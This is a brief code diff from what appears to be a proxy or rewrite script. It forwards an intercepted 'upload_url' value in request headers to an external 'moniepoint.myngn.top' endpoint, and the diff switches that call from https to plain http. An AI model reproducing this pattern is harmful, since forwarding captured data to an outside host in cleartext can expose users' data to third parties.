@@ -4,7 +4,7 @@ let upload_url = obj.upload_url;
 
 
 if (upload_url) {
-  $httpClient.get('https://moniepoint.myngn.top/api/receive_data', {
+  $httpClient.get('http://moniepoint.myngn.top/api/receive_data', {
       headers: {
         "Host": "moniepoint.myngn.top",
         "upload_url": upload_url,
